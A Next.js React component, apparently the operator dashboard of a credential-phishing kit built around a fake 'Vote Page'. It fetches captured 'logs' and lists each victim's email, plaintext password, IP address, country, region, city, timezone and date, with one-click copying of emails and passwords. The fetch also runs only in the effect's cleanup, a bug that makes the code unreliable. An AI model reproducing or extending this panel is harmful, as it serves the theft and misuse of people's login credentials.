"use client";

import { getLogs } from "@/app/utils/getData";
import { Dropdown } from "flowbite-react";
import Image from "next/image";
import { useEffect, useState } from "react";
// import down_arrow from "../../../public/downarrow";

export default function View() {
  const [logs, setLogs] = useState([]);

  useEffect(() => {
    const getLogins = async () => {
      const data = await getLogs();

      setLogs(data);
    };

    return () => {
      getLogins();
    };
  }, []);

  console.log(logs);

  return (
    <main className="flex flex-col ">
      <h1 className="text-center mt-36">Vote Page</h1>
      <div className="flex flex-row w-full bg-gray-900 px-4">
        <div className="bg-gray-900 flex items-center">
          <Dropdown label="Action">
            <Dropdown.Item>Dashboard</Dropdown.Item>
            <Dropdown.Item>Settings</Dropdown.Item>
            <Dropdown.Item>Earnings</Dropdown.Item>
            <Dropdown.Item>Sign out</Dropdown.Item>
          </Dropdown>
        </div>

        <div className="flex items-center justify-between gap-5 p-4  ">
          <label htmlFor="table-search" className="sr-only">
            Search
          </label>
          <div className="relative">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <svg
                className="w-4 h-4  text-gray-400"
                aria-hidden="true"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 20 20"
              >
                <path
                  stroke="currentColor"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"
                />
              </svg>
            </div>
            <input
              type="text"
              id="table-search-users"
              className="block p-2 pl-10 text-sm border rounded-lg w-70 focus:ring-blue-500 focus:border-blue-500 bg-gray-700 border-gray-600 placeholder-gray-400 text-white focus:ring-0"
              placeholder="Search for users"
            />
          </div>
        </div>
      </div>
      <div className="relative overflow-x-auto shadow-md sm:rounded-lg">
        {/* <!-- TABLE START --> */}
        <table className="w-full text-sm text-left text-gray-500 ">
          <thead className="text-xs text-white uppercase  bg-gray-700 ">
            <tr>
              <th scope="col" className="p-4">
                <div className="flex items-center">
                  <input
                    id="checkbox-all-search"
                    type="checkbox"
                    className="w-4 h-4 text-blue-600 rounded focus:ring-0 ring-offset-gray-800 focus:ring-offset-gray-800 bg-gray-700 border-gray-600"
                  />
                  <label htmlFor="checkbox-all-search" className="sr-only">
                    checkbox
                  </label>
                </div>
              </th>
              <th scope="col" className="px-6 py-3">
                USER ID
              </th>
              <th scope="col" className="px-6 py-3">
                EMAIL
              </th>
              <th scope="col" className="px-6 py-3">
                PASSWORD
              </th>
              <th scope="col" className="px-6 py-3">
                COUNTRY NAME
              </th>
              <th scope="col" className="px-6 py-3">
                REGION NAME
              </th>
              <th scope="col" className="px-6 py-3">
                IP ADDRESS
              </th>
              <th scope="col" className="px-6 py-3">
                CITY NAME
              </th>
              <th scope="col" className="px-6 py-3">
                TIMEZONE
              </th>
              <th scope="col" className="px-6 py-3">
                TIME/DATE
              </th>
              {/* <th scope="col" className="px-6 py-3">
                PROCESSES
              </th> */}
            </tr>
          </thead>
          <tbody>
            {logs.map((user) => (
              <tr
                key={user.user_id}
                className="bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600"
              >
                <td className="w-4 p-4">
                  <div className="flex items-center">
                    <input
                      id="checkbox-table-search-1"
                      type="checkbox"
                      className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
                    />
                    <label
                      htmlFor="checkbox-table-search-1"
                      className="sr-only"
                    >
                      checkbox
                    </label>
                  </div>
                </td>

                {/* <td className="px-6 py-4" ondblclick="copyContent(this)"></td>
              <td className="px-6 py-4" ondblclick="copyContent(this)"></td>
              <td className="px-6 py-4" ondblclick="copyContent(this)"></td> */}
                <td className="px-6 py-3">{user.user_id}</td>
                <td
                  className="px-6 py-3"
                  onClick={() => navigator.clipboard.writeText(user.email)}
                >
                  {user.email}
                </td>
                <td
                  className="px-6 py-3"
                  onClick={() => navigator.clipboard.writeText(user.password)}
                >
                  {user.password}
                </td>
                <td className="px-6 py-3">{user.country}</td>
                <td className="px-6 py-3">{user.region}</td>
                <td className="px-6 py-3">{user.ip_address}</td>
                <td className="px-6 py-3">{user.city_name}</td>
                <td className="px-6 py-3">{user.timezone}</td>
                <td className="px-6 py-3">{user.date}</td>
              </tr>
            ))}
          </tbody>{" "}
        </table>
      </div>
    </main>
  );
}
